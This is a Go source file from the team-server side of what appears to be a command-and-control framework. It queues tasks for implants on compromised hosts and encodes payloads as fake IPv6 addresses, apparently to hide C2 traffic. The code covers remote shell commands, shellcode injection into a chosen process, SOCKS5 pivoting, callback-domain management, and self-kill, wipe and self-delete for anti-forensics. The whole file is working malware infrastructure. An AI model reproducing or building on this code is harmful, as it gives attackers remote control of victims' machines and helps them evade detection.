package client

import (
	"TeamServer/database"
	"TeamServer/debug"
	"TeamServer/macro"
	"TeamServer/modules"
	"TeamServer/packer"
	"TeamServer/support"
	"encoding/hex"
	"strconv"
	"time"
)

func ParseBuffToIPv6(ByteBuff []byte) []string {
	Buff := hex.EncodeToString(ByteBuff)
	BuffSize := len(Buff)
	BuffIPv6 := make([]string, 0)
	incremental := 0
	if BuffSize <= 32 {
		rand, _ := support.Randipv6Runes(16)
		rand = Buff + rand[len(Buff):]
		DataBuffer := support.GenerateIPv6(rand)
		BuffIPv6 = append(BuffIPv6, DataBuffer)

	} else {
		for {
			if incremental+32 >= BuffSize {
				RemaingPartSize := BuffSize - incremental
				RemaingPart := Buff[incremental : incremental+RemaingPartSize]
				rand, _ := support.Randipv6Runes(16)
				rand = RemaingPart + rand[len(RemaingPart):]
				DataBuffer := support.GenerateIPv6(rand)
				BuffIPv6 = append(BuffIPv6, DataBuffer)
				break
			} else {
				DataBuffer := support.GenerateIPv6(Buff[incremental : incremental+32])
				BuffIPv6 = append(BuffIPv6, DataBuffer)
				incremental = incremental + 32
			}
		}

	}
	return BuffIPv6
}

type TaskManager struct {
	Target    *macro.TargetInfo
	TaskID    string
	Arguments map[string]interface{}
}

func NewTaskManager(Target *macro.TargetInfo, TaskID string, Arguments map[string]interface{}) *TaskManager {
	var TaskM = new(TaskManager)
	TaskM.Arguments = Arguments
	TaskM.TaskID = TaskID
	TaskM.Target = Target
	return TaskM
}

// func (tm *TaskManager) AddNewTask() {

// 	switch tm.TaskType {
// 	case macro.Macro_CT_AddChangeSleep:
// 		tm.ChangeSleep(1,)
// 		return

// 	default:
// 		debug.Warn("Unknown Task Type [%d]", tm, tm.TaskType)
// 	}

// }

func (tm *TaskManager) AppendNewTask(NewTask *macro.TasksPacket, Packer *packer.Packer) bool {

	ListIpv6 := ParseBuffToIPv6(Packer.Buffer())
	NewTask.Task = ListIpv6
	NewTask.Size = len(ListIpv6)
	NewTask.Remaing = 0
	NewTask.IsLastPart = false
	NewTask.IsFirstPart = true
	NewTask.TaskID = tm.TaskID
	tm.Target.Lock()
	defer tm.Target.Unlock()
	tm.Target.TaskContainer = append(tm.Target.TaskContainer, NewTask)
	return true

}
func (tm *TaskManager) ChangeSleep(NewSleep int, NewJit int) bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskType = macro.MacroChangeSleepCodeTA
	NewTask.TaskName = "sleep [" + strconv.Itoa(NewSleep) + " " + strconv.Itoa(NewJit) + "]"
	var Packer = packer.NewPacker()

	Packer.AddInt(NewSleep)
	Packer.AddInt(NewJit) // Only for debug
	debug.Info("Get New Sleep Time [%d] and Jit [%d], for Session [%s | %s]", NewSleep, NewJit, tm.Target.TargetData.SessionID, tm.Target.TargetData.HostName)

	tm.AppendNewTask(NewTask, Packer)
	return true
}

func (tm *TaskManager) ShellCommand(Command string) bool {
	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskType = macro.MacroShellCodeTA
	NewTask.TaskName = "shell [" + Command + "]"
	var Packer = packer.NewPacker()
	Command = support.AddNullByte(Command)
	Packer.AddString(Command)
	tm.AppendNewTask(NewTask, Packer)

	return true
}

func (tm *TaskManager) AddNewCallBackDomain(DomainName string) bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskType = macro.MacroNewCallBackDomainCodeTA
	NewTask.TaskName = "adddomain [" + DomainName + "]"
	var Packer = packer.NewPacker()
	ok, NewListener := support.AddNewListener(DomainName)
	debug.Error("%v", macro.Config.Domains)
	DomainName = support.AddNullByte(DomainName)
	Packer.AddString(DomainName)
	tm.AppendNewTask(NewTask, Packer)
	if ok {
		go SendClientListenerInfo(NewListener, macro.Brodcast, nil)
	} else {
		SendConsoleWarning(tm.Target.TargetData, "Task Add but Domain ["+DomainName+"] Already Listening...")
	}

	return true
}

func (tm *TaskManager) DeleteCallBackDomain(DomainName string) bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskType = macro.MacroDeleteBackDomainCodeTA
	NewTask.TaskName = "deldomain [" + DomainName + "]"
	var Packer = packer.NewPacker()
	debug.Error("%v", macro.Config.Domains)
	DomainName = support.AddNullByte(DomainName)
	Packer.AddString(DomainName)
	tm.AppendNewTask(NewTask, Packer)

	return true
}

func (tm *TaskManager) Inject(ShellCode []byte, ProcessID int) bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskName = "inject PID [" + strconv.Itoa(ProcessID) + "]"
	NewTask.TaskType = macro.MacroInjectCodeTA
	var Packer = packer.NewPacker()
	Packer.AddBytes(ShellCode)
	Packer.AddInt(ProcessID)
	tm.AppendNewTask(NewTask, Packer)

	return true
}

func (tm *TaskManager) StartSocks5(HostName string, AgentPort string, ProxyPort string) bool {
	resultChan := make(chan string)
	Aport := ":" + AgentPort
	Pport := ":" + ProxyPort

	go modules.StartProxyServer(Aport, Pport, resultChan)

	select {
	case result := <-resultChan:
		// Handle the result.
		switch result {
		case "success":
			go SendConsoleSuccessful(tm.Target.TargetData, "Socks5 Proxy Started")
			var NewTask *macro.TasksPacket = new(macro.TasksPacket)
			NewTask.TaskName = "proxystart [" + HostName + " " + AgentPort + " " + ProxyPort + "]"
			NewTask.TaskType = macro.MacroStartProxyCodeTA
			var Packer = packer.NewPacker()
			HostName = support.AddNullByte(HostName)
			Packer.AddString(HostName)
			AgentPort = support.AddNullByte(AgentPort)
			Packer.AddString(AgentPort)
			tm.AppendNewTask(NewTask, Packer)
			return true
		case "Proxy Already Runing":
			go SendConsoleWarning(tm.Target.TargetData, "Error Proxy Already Runing")

			return false
		case "Listen agentAddr Error":
			go SendConsoleWarning(tm.Target.TargetData, "Fail To Listening on Agent Port "+AgentPort)

			return false
		case "Listen proxyAddr Error":
			go SendConsoleWarning(tm.Target.TargetData, "Fail To Listening on Proxy Port "+ProxyPort)
			return false
		}
	case <-time.After(5 * time.Second):
		// Timed out after 5 seconds.
		go SendConsoleWarning(tm.Target.TargetData, "Fail Timed out, StartSocks5")
		debug.Error("Timed out, StartSocks5.")
		return false
	}
	return false // should never reach here, but just to be safe
}

func (tm *TaskManager) StopProxy(HostName string, AgentPort string, ProxyPort string) bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskName = "proxystop [" + HostName + " " + AgentPort + " " + ProxyPort + "]"
	NewTask.TaskType = macro.MacroStopProxyCodeTA
	var Packer = packer.NewPacker()
	Packer.AddInt(0)
	tm.AppendNewTask(NewTask, Packer)
	ok := modules.CloseProxy()
	if ok {
		go SendConsoleSuccessful(tm.Target.TargetData, "Socks Proxy Closed!")
	} else {
		go SendConsoleWarning(tm.Target.TargetData, "No Proxy Runing!")
	}
	return true
}

func (tm *TaskManager) ListAllActiveDomain() bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskName = "listdomain"

	NewTask.TaskType = macro.MacroListAllActiveDomainCodeTA
	var Packer = packer.NewPacker()
	Packer.AddInt(0)
	tm.AppendNewTask(NewTask, Packer)
	return true
}

func (tm *TaskManager) SelfKill() bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskType = macro.MacroKillTA
	var Packer = packer.NewPacker()
	Packer.AddInt(0)
	tm.AppendNewTask(NewTask, Packer)
	return true
}

func (tm *TaskManager) SelfWipe() bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskName = "wipe"
	NewTask.TaskType = macro.MacroKillTA
	var Packer = packer.NewPacker()
	Packer.AddInt(1)
	tm.AppendNewTask(NewTask, Packer)
	return true
}

func (tm *TaskManager) SelfDel() bool {

	var NewTask *macro.TasksPacket = new(macro.TasksPacket)
	NewTask.TaskName = "selfdel yes"
	NewTask.TaskType = macro.MacroSelfDelTA
	var Packer = packer.NewPacker()
	Packer.AddInt(0)
	tm.AppendNewTask(NewTask, Packer)
	return true
}

func InitializeNewTarget(TargetID string) *macro.TargetInfo {

	dt := time.Now()
	LastPing1970 := strconv.FormatInt(dt.Unix(), 10)
	NewTarget := &macro.TargetInfo{
		ActiveMessage: true,
		TargetData: database.TargetSession{
			SessionID:    TargetID,
			HostName:     "<Goust>",
			OS:           "<Goust>",
			UserName:     "<Goust>",
			ProcessID:    "0",
			LastPing:     "0",
			LastPing1970: LastPing1970,
		},
		MassageQueue: 1,
		MessageContainer: macro.MessagePacket{
			MessageType: macro.MacroRegisterCode,
		},
	}

	macro.TargetMap[NewTarget.TargetData.SessionID] = NewTarget
	SendClientNewTarget(&NewTarget.TargetData, macro.Brodcast, nil)
	err := database.DB.TargetSessionHandler.AddTargetSession(&NewTarget.TargetData)
	if err != nil {
		debug.Error(err.Error())
	}
	return NewTarget
}
